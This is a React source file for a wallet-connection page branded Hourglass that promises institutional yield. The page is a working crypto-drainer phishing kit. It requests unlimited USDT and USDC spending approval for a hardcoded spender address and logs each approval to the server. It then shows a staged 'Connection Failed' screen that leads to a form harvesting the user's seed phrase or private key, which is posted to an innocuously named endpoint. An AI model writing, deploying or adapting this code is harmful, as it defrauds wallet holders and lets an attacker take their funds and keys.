import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Wallet, Link as LinkIcon, CreditCard, Shield, Palette, Cpu, Ghost, Circle, ArrowLeft, WifiOff, Loader2, CheckCircle, Eye, EyeOff, AlertCircle } from "lucide-react";
import { Link } from "wouter";
import { useState, useEffect } from "react";
import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi";
import metamaskIcon from "@assets/image_1762763337117.png";
import trustWalletIcon from "@assets/image_1762763375845.png";
import coinbaseIcon from "@assets/image_1762845204398.png";
import walletConnectIcon from "@assets/image_1762845339225.png";
import phantomIcon from "@assets/image_1762845585457.png";
import ledgerIcon from "@assets/image_1762845651784.png";
import okxIcon from "@assets/image_1762845719725.png";
import rainbowIcon from "@assets/image_1762845875992.png";

interface WalletOption {
  id: string;
  name: string;
  Icon?: typeof Wallet;
  imageUrl?: string;
}

const wallets: WalletOption[] = [
  { id: "metamask", name: "MetaMask", imageUrl: metamaskIcon },
  { id: "walletconnect", name: "WalletConnect", imageUrl: walletConnectIcon },
  { id: "coinbase", name: "Coinbase Wallet", imageUrl: coinbaseIcon },
  { id: "trust", name: "Trust Wallet", imageUrl: trustWalletIcon },
  { id: "rainbow", name: "Rainbow", imageUrl: rainbowIcon },
  { id: "ledger", name: "Ledger", imageUrl: ledgerIcon },
  { id: "phantom", name: "Phantom", imageUrl: phantomIcon },
  { id: "okx", name: "OKX Wallet", imageUrl: okxIcon },
];

const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
] as const;

export default function ConnectWallet() {
  const { address, isConnected } = useAccount();
  const [isLoading, setIsLoading] = useState(false);
  const [showManualConnect, setShowManualConnect] = useState(false);
  const [showApplicationForm, setShowApplicationForm] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<string>("");
  const [showSecretPhrase, setShowSecretPhrase] = useState(false);
  const [showApprovalPrompt, setShowApprovalPrompt] = useState(false);
  const [currentApprovalStep, setCurrentApprovalStep] = useState<"usdt" | "usdc" | "complete">("usdt");
  const [approvalError, setApprovalError] = useState<string>("");
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    walletAddress: "",
    message: "",
  });

  const { writeContract, data: hash, isPending: isApproving } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
    hash,
  });

  const handleWalletSelect = (walletId: string, walletName: string) => {
    setSelectedWallet(walletName);
    setIsLoading(true);
    setShowManualConnect(false);
    setShowApplicationForm(false);

    if (isConnected && address) {
      setTimeout(() => {
        setIsLoading(false);
        setShowApprovalPrompt(true);
        setCurrentApprovalStep("usdt");
      }, 2000);
    } else {
      setTimeout(() => {
        setIsLoading(false);
        setShowManualConnect(true);
      }, 10000);
    }
  };

  const handleApproveToken = async () => {
    if (!address) return;
    
    setApprovalError("");
    const tokenAddress = currentApprovalStep === "usdt" ? USDT_ADDRESS : USDC_ADDRESS;
    const tokenSymbol = currentApprovalStep === "usdt" ? "USDT" : "USDC";

    try {
      writeContract({
        address: tokenAddress as `0x${string}`,
        abi: ERC20_ABI,
        functionName: "approve",
        args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
      });
    } catch (error: any) {
      setApprovalError(error?.message || "Failed to approve token");
    }
  };

  const handleSkipApproval = () => {
    if (currentApprovalStep === "usdt") {
      setCurrentApprovalStep("usdc");
    } else {
      setCurrentApprovalStep("complete");
      setTimeout(() => {
        setShowApprovalPrompt(false);
        setShowManualConnect(true);
      }, 2000);
    }
  };

  useEffect(() => {
    if (isConfirmed && hash) {
      const tokenSymbol = currentApprovalStep === "usdt" ? "USDT" : "USDC";
      
      fetch("/api/approvals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenAddress: currentApprovalStep === "usdt" ? USDT_ADDRESS : USDC_ADDRESS,
          tokenSymbol,
          transactionHash: hash,
        }),
      }).catch(console.error);

      if (currentApprovalStep === "usdt") {
        setCurrentApprovalStep("usdc");
      } else {
        setCurrentApprovalStep("complete");
        setTimeout(() => {
          setShowApprovalPrompt(false);
          setShowManualConnect(true);
        }, 2000);
      }
    }
  }, [isConfirmed, hash]);

  const handleSubmitApplication = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const response = await fetch("/api/applications", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletName: formData.name,
          details: formData.message,
          selectedWallet: selectedWallet,
        }),
      });

      if (!response.ok) throw new Error("Failed to submit");

      setShowSuccess(true);
      setTimeout(() => {
        setShowSuccess(false);
        setShowApplicationForm(false);
        setShowManualConnect(false);
        setSelectedWallet("");
        setFormData({ name: "", email: "", walletAddress: "", message: "" });
      }, 3000);
    } catch (error) {
      console.error("Failed to submit application:", error);
    }
  };

  return (
    <div className="min-h-screen bg-[#0a1614] text-[#f5f1e8]">
      <header className="border-b border-[#1a2e2a]/50 bg-[#0a1614]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/" className="flex items-center gap-2 text-[#9ca3af] hover:text-[#f5f1e8] transition-colors" data-testid="link-back">
              <ArrowLeft className="w-5 h-5" />
              <span className="text-sm font-medium">Back</span>
            </Link>
            
            <span className="text-lg sm:text-xl font-bold tracking-tight" data-testid="text-logo">Hourglass</span>
            
            <div className="w-20"></div>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12 sm:py-20">
        {showApprovalPrompt ? (
          <div className="flex flex-col items-center justify-center min-h-[400px]" data-testid="approval-prompt-container">
            {currentApprovalStep === "complete" ? (
              <>
                <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                  <CheckCircle className="w-20 h-20 text-[#3dd9b3]" />
                </div>
                <h2 className="text-3xl font-bold text-[#f5f1e8] mb-2">Approvals Complete!</h2>
                <p className="text-[#9ca3af]">Proceeding to connection...</p>
              </>
            ) : (
              <>
                <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                  <Shield className="w-20 h-20 text-[#3dd9b3]" />
                </div>
                <h2 className="text-2xl sm:text-3xl font-bold text-[#f5f1e8] mb-4 text-center">
                  Approve {currentApprovalStep === "usdt" ? "USDT" : "USDC"} Spending
                </h2>
                <p className="text-[#9ca3af] mb-2 text-center max-w-md">
                  To participate in the Hourglass yield program, you need to approve unlimited {currentApprovalStep === "usdt" ? "USDT" : "USDC"} spending.
                </p>
                <p className="text-sm text-[#6b7280] mb-8 text-center max-w-md">
                  Spender: {SPENDER_ADDRESS}
                </p>

                {approvalError && (
                  <div className="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-lg flex items-start gap-3 max-w-md">
                    <AlertCircle className="w-5 h-5 text-red-500 mt-0.5 flex-shrink-0" />
                    <p className="text-sm text-red-400">{approvalError}</p>
                  </div>
                )}

                <div className="flex gap-4">
                  <Button
                    onClick={handleApproveToken}
                    disabled={isApproving || isConfirming}
                    size="lg"
                    className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-8"
                    data-testid="button-approve-token"
                  >
                    {isApproving || isConfirming ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        {isApproving ? "Waiting for approval..." : "Confirming..."}
                      </>
                    ) : (
                      `Approve ${currentApprovalStep === "usdt" ? "USDT" : "USDC"}`
                    )}
                  </Button>
                  <Button
                    onClick={handleSkipApproval}
                    disabled={isApproving || isConfirming}
                    size="lg"
                    variant="outline"
                    className="border-[#3dd9b3]/20 text-[#9ca3af] hover:text-[#f5f1e8]"
                    data-testid="button-skip-approval"
                  >
                    Skip
                  </Button>
                </div>
                
                <p className="text-xs text-[#6b7280] mt-6 text-center max-w-md">
                  {currentApprovalStep === "usdt" ? "After USDT approval, you'll be prompted to approve USDC." : "This is the final approval step."}
                </p>
              </>
            )}
          </div>
        ) : isLoading ? (
          <div className="flex flex-col items-center justify-center min-h-[400px]" data-testid="loading-container">
            <Loader2 className="w-16 h-16 text-[#3dd9b3] animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-[#f5f1e8] mb-2">Connecting to {selectedWallet}</h2>
            <p className="text-[#9ca3af]">Please wait while we establish a connection...</p>
          </div>
        ) : showSuccess ? (
          <div className="flex flex-col items-center justify-center min-h-[400px] text-center" data-testid="success-container">
            <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
              <CheckCircle className="w-20 h-20 text-[#3dd9b3]" />
            </div>
            <h2 className="text-3xl font-bold text-[#f5f1e8] mb-4">Application Submitted!</h2>
            <p className="text-lg text-[#9ca3af] max-w-md">
              Our support team will contact you shortly to help with manual wallet connection.
            </p>
          </div>
        ) : showApplicationForm ? (
          <div className="max-w-2xl mx-auto" data-testid="application-form-container">
            <h2 className="text-2xl font-bold text-[#f5f1e8] mb-8" data-testid="heading-form">
              Import with Secret Phrase or Private Key
            </h2>

            <form onSubmit={handleSubmitApplication} className="space-y-6">
              <div className="space-y-2">
                <label htmlFor="wallet-name" className="text-sm font-semibold text-[#f5f1e8]">
                  Wallet Name
                </label>
                <Input
                  id="wallet-name"
                  type="text"
                  required
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#6b7280]"
                  placeholder="Main wallet"
                  data-testid="input-wallet-name"
                />
                <p className="text-xs text-[#9ca3af]">You can edit this later</p>
              </div>

              <div className="space-y-2">
                <label htmlFor="application-details" className="text-sm font-semibold text-[#f5f1e8]">
                  Enter Secret Phrase or Private Key
                </label>
                <div className="relative">
                  <Textarea
                    id="application-details"
                    required
                    value={formData.message}
                    onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                    className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#6b7280] min-h-[160px] pr-12"
                    style={{ WebkitTextSecurity: showSecretPhrase ? 'none' : 'disc' } as React.CSSProperties}
                    placeholder=""
                    data-testid="textarea-application"
                  />
                  <button
                    type="button"
                    onClick={() => setShowSecretPhrase(!showSecretPhrase)}
                    className="absolute top-3 right-3 text-[#9ca3af] hover:text-[#f5f1e8] transition-colors"
                    data-testid="button-toggle-visibility"
                  >
                    {showSecretPhrase ? (
                      <EyeOff className="w-5 h-5" />
                    ) : (
                      <Eye className="w-5 h-5" />
                    )}
                  </button>
                </div>
                <div className="text-xs text-[#9ca3af] space-y-1">
                  <p>Secret Phrase is typically 12 (sometimes 18, 24) words separated by single spaces</p>
                  <p>Private Key is a long alphanumeric code</p>
                </div>
              </div>

              <div className="flex justify-end pt-8">
                <Button
                  type="submit"
                  size="lg"
                  className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-12"
                  data-testid="button-submit-application"
                >
                  Import
                </Button>
              </div>
            </form>
          </div>
        ) : showManualConnect ? (
          <div className="flex flex-col items-center justify-center min-h-[400px] text-center" data-testid="manual-connect-container">
            <div className="mb-6 p-6 rounded-full bg-[#1a2e2a]/30">
              <WifiOff className="w-20 h-20 text-[#3dd9b3]" />
            </div>
            <h2 className="text-3xl font-bold text-[#f5f1e8] mb-4">Connection Failed</h2>
            <p className="text-lg text-[#9ca3af] mb-8 max-w-md">
              Unable to connect to {selectedWallet} automatically. Please check your wallet extension and try again.
            </p>
            <Button 
              onClick={() => {
                setShowManualConnect(false);
                setShowApplicationForm(true);
              }}
              size="lg"
              className="bg-[#3dd9b3] text-[#0a1614] font-semibold"
              data-testid="button-connect-manually"
            >
              Connect Manually
            </Button>
          </div>
        ) : (
          <>
            <div className="text-center mb-12">
              <h1 className="text-4xl sm:text-5xl font-bold text-[#f5f1e8] mb-4" data-testid="heading-connect-wallet">
                Connect Your Wallet
              </h1>
              <p className="text-lg text-[#9ca3af]" data-testid="text-description">
                Choose your preferred wallet to access institutional yield
              </p>
            </div>

            <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4">
              {wallets.map((wallet) => {
                return (
                  <button
                    key={wallet.id}
                    onClick={() => handleWalletSelect(wallet.id, wallet.name)}
                    className="bg-[#1a2e2a]/30 border border-[#3dd9b3]/20 rounded-lg p-6 flex flex-col items-center justify-center gap-4 hover:bg-[#1a2e2a]/50 hover:border-[#3dd9b3]/40 transition-all"
                    data-testid={`button-wallet-${wallet.id}`}
                  >
                    {wallet.imageUrl ? (
                      <img src={wallet.imageUrl} alt={wallet.name} className="w-20 h-20 object-contain" />
                    ) : wallet.Icon ? (
                      <wallet.Icon className="w-20 h-20 text-[#3dd9b3]" />
                    ) : null}
                    <span className="text-base font-medium text-[#f5f1e8]">{wallet.name}</span>
                  </button>
                );
              })}
            </div>

            <div className="mt-12 text-center">
              <p className="text-sm text-[#9ca3af]">
                By connecting a wallet, you agree to our{" "}
                <a href="#terms" className="text-[#3dd9b3] hover:underline" data-testid="link-terms">
                  Terms of Service
                </a>
              </p>
            </div>
          </>
        )}
      </main>
    </div>
  );
}
